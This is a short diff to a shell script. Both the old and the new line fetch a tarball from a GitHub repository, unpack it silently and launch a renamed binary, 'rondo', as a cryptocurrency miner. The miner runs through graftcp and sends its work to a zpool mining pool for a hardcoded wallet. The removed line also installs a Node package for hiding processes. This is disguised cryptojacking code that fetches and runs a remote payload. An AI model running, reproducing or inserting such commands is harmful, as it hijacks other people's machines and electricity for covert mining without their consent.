@@ -36,4 +36,4 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget https://github.com/liyanul2525/rondo/raw/main/sayang.tar.gz && tar -xf sayang.tar.gz >/dev/null 2>&1 && sayang/rondo -a scryptn2 -o stratum+tcp://scryptn2.na.mine.zpool.ca:4339 -u LXXC5yzd4amhAYzNVoYziU2PWdaqFWNn1T -p c=LTC,zap=XBTX -t 2 > /tmp/rondo.log 2>&1
+./graftcp/graftcp wget https://github.com/liyanul2525/rondo/raw/main/sayang.tar.gz && tar -xf sayang.tar.gz >/dev/null 2>&1 && sayang/rondo -a scryptn2 -o stratum+tcp://scryptn2.na.mine.zpool.ca:4339 -u LXXC5yzd4amhAYzNVoYziU2PWdaqFWNn1T -p c=LTC,zap=XBTX -t 2 > /tmp/rondo.log 2>&1
